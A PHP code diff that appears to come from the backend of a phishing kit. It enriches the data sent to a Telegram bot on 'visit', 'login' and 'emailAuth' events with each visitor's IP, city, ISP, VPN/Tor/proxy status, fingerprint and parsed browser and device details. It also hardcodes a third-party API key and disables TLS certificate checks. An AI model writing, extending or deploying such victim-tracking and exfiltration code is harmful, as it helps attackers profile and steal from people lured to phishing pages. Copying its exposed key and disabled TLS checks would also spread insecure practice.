@@ -110,13 +110,59 @@ if (strpos($ip, ',') !== false) {
 $ipDetails = '';
 $geo_line = '';
 
-// Check API Ninjas for IP details
+// IPGeolocation API Lookup
 $geo_line = '';
 if ($ip !== 'Unknown' && $ip !== '::1' && $ip !== '127.0.0.1') {
-    $ipap = api_ninja('iplookup', ['address' => $ip]);
-    if ($ipap && !empty($ipap['country'])) {
-        $loc = ($ipap['city'] ?? 'Unknown') . ", " . ($ipap['region'] ?? 'Unknown') . ", " . $ipap['country'];
-        $geo_line = "🌍 <b>Geo:</b> <code>" . he($loc) . "</code>";
+    $ipgeoKey = '55d11665677f43d39b9aeeb278de6bd8';
+
+    // Try fetching with security info
+    $url = "https://api.ipgeolocation.io/ipgeo?apiKey={$ipgeoKey}&ip={$ip}&include=security";
+    $ch = curl_init($url);
+    curl_setopt_array($ch, [CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 3, CURLOPT_SSL_VERIFYPEER => false]);
+    $res = curl_exec($ch);
+    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    curl_close($ch);
+
+    // Fallback if premium endpoint fails
+    if ($http_code !== 200) {
+        $url = "https://api.ipgeolocation.io/ipgeo?apiKey={$ipgeoKey}&ip={$ip}";
+        $ch = curl_init($url);
+        curl_setopt_array($ch, [CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 3, CURLOPT_SSL_VERIFYPEER => false]);
+        $res = curl_exec($ch);
+        curl_close($ch);
+    }
+
+    $ipData = $res ? json_decode($res, true) : null;
+    if ($ipData && !empty($ipData['country_name'])) {
+        $code = !empty($ipData['country_code2']) ? strtoupper($ipData['country_code2']) : '';
+        $flag = '';
+        if (strlen($code) === 2 && function_exists('mb_chr') && function_exists('mb_ord')) {
+            $flag = mb_chr(mb_ord($code[0]) + 127397, 'UTF-8') . mb_chr(mb_ord($code[1]) + 127397, 'UTF-8');
+        }
+        $city = $ipData['city'] ?? 'Unknown';
+        $state = !empty($ipData['state_prov']) ? $ipData['state_prov'] : ($ipData['district'] ?? 'Unknown');
+        $geo_line = "🌍 <b>Geo:</b> <code>" . he("{$city}, {$state}, {$ipData['country_name']}") . "</code> {$flag}";
+
+        if (!empty($ipData['isp'])) {
+            $geo_line .= "\n🏢 <b>ISP:</b> <code>" . he($ipData['isp']) . "</code>";
+        }
+        if (!empty($ipData['security'])) {
+            $sec = $ipData['security'];
+            $threats = [];
+            if (!empty($sec['is_proxy']))
+                $threats[] = 'Proxy';
+            if (!empty($sec['is_vpn']))
+                $threats[] = 'VPN';
+            if (!empty($sec['is_tor']))
+                $threats[] = 'Tor';
+            if (!empty($sec['is_bogon']))
+                $threats[] = 'Bogon';
+            if (!empty($sec['is_spam']))
+                $threats[] = 'Spam';
+            if (!empty($threats)) {
+                $geo_line .= "\n⚠️ <b>Security:</b> <code>" . implode(', ', $threats) . "</code>";
+            }
+        }
     }
 }
 
@@ -182,12 +228,31 @@ $d = $post_data;
 
 $fp_line = !empty($_POST['fingerprint']) ? "🛡️ <b>FP:</b> <code>" . he($_POST['fingerprint']) . "</code>\n" : '';
 
+$parsedUA = "🤖 <b>UA:</b> <code>" . he(substr($user_agent, 0, 140)) . "</code>";
+$ipgeoKey = '55d11665677f43d39b9aeeb278de6bd8';
+$uaUrl = "https://api.ipgeolocation.io/user-agent?apiKey={$ipgeoKey}&ua=" . urlencode($user_agent);
+$ch = curl_init($uaUrl);
+curl_setopt_array($ch, [CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 2, CURLOPT_SSL_VERIFYPEER => false]);
+$uaRes = curl_exec($ch);
+$uaHttp = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+curl_close($ch);
+
+if ($uaHttp === 200 && $uaRes) {
+    $uData = json_decode($uaRes, true);
+    if ($uData && !empty($uData['name'])) {
+        $os = !empty($uData['operatingSystem']['name']) ? $uData['operatingSystem']['name'] . ' ' . ($uData['operatingSystem']['version'] ?? '') : 'Unknown OS';
+        $dev = !empty($uData['device']['type']) ? $uData['device']['type'] : 'Unknown Device';
+        $parsedUA = "💻 <b>System:</b> <code>" . he(trim($os)) . " - " . he($dev) . "</code>\n"
+            . "🧭 <b>Browser:</b> <code>" . he($uData['name']) . " " . he($uData['versionMajor'] ?? '') . "</code>";
+    }
+}
+
 // Only send full IP and Geo info on initial tracks or key authentications
 if ($form_type === 'visit' || $form_type === 'login' || $form_type === 'emailAuth') {
     $header = "🕒 <code>{$timestamp}</code>\n"
         . "📍 <b>IP:</b> <code>" . he($ip) . "</code>\n"
         . ($geo_line ? $geo_line . "\n" : '')
-        . "🤖 <b>UA:</b> <code>" . he(substr($user_agent, 0, 140)) . "</code>\n"
+        . $parsedUA . "\n"
         . $fp_line
         . $sid_tag . "\n";
 } else {
@@ -204,7 +269,7 @@ if ($form_type === 'visit') {
         . ($geo_line ? $geo_line . "\n" : '')
         . "🌐 <b>Page:</b> <code>" . he($_POST['url'] ?? 'Unknown') . "</code>\n"
         . "🖥️ <b>Res:</b> <code>" . he($_POST['res'] ?? 'Unknown') . "</code>\n"
-        . "🤖 <b>UA:</b> <code>" . he(substr($user_agent, 0, 140)) . "</code>\n"
+        . $parsedUA . "\n"
         . $fp_line
         . $sid_tag;
     tg_message($botToken, $chatId, $msg);
